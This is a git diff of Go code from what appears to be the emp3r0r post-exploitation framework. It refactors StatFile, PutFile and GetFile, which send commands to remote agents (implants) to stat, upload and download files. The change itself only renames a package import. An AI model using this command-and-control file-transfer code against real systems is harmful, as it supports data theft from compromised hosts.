@@ -7,13 +7,13 @@ import (
 	"time"
 
 	"github.com/google/uuid"
-	"github.com/jm33-m0/emp3r0r/core/lib/agent"
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 // StatFile Get stat info of a file on agent
-func StatFile(filepath string, a *agent.SystemInfo) (fi *util.FileStat, err error) {
+func StatFile(filepath string, a *emp3r0r_data.SystemInfo) (fi *util.FileStat, err error) {
 	cmd := fmt.Sprintf("!stat %s %s", filepath, uuid.NewString())
 	err = SendCmd(cmd, a)
 	if err != nil {
@@ -44,7 +44,7 @@ func StatFile(filepath string, a *agent.SystemInfo) (fi *util.FileStat, err erro
 }
 
 // PutFile put file to agent
-func PutFile(lpath, rpath string, a *agent.SystemInfo) error {
+func PutFile(lpath, rpath string, a *emp3r0r_data.SystemInfo) error {
 	// file sha256sum
 	CliPrintInfo("Calculating sha256sum of %s", lpath)
 	sum := tun.SHA256SumFile(lpath)
@@ -79,7 +79,7 @@ func PutFile(lpath, rpath string, a *agent.SystemInfo) error {
 }
 
 // GetFile get file from agent
-func GetFile(filepath string, a *agent.SystemInfo) error {
+func GetFile(filepath string, a *emp3r0r_data.SystemInfo) error {
 	if !util.IsFileExist(FileGetDir) {
 		err := os.MkdirAll(FileGetDir, 0700)
 		if err != nil {
@@ -87,7 +87,7 @@ func GetFile(filepath string, a *agent.SystemInfo) error {
 		}
 	}
 	CliPrintInfo("Waiting for response from agent %s", a.Tag)
-	var data agent.MsgTunData
+	var data emp3r0r_data.MsgTunData
 	filename := FileGetDir + util.FileBaseName(filepath) // will copy the downloaded file here when we are done
 	tempname := filename + ".downloading"                // will be writing to this file
 	lock := filename + ".lock"                           // don't try to duplicate the task
@@ -128,11 +128,11 @@ func GetFile(filepath string, a *agent.SystemInfo) error {
 	FTPMutex.Unlock()
 
 	// h2x
-	ftpSh.H2x = new(agent.H2Conn)
+	ftpSh.H2x = new(emp3r0r_data.H2Conn)
 
 	// cmd
 	cmd := fmt.Sprintf("#get %s %d %s", filepath, offset, ftpSh.Token)
-	data.Payload = fmt.Sprintf("cmd%s%s", agent.OpSep, cmd)
+	data.Payload = fmt.Sprintf("cmd%s%s", emp3r0r_data.OpSep, cmd)
 	data.Tag = a.Tag
 	err = Send2Agent(&data, a)
 	if err != nil {
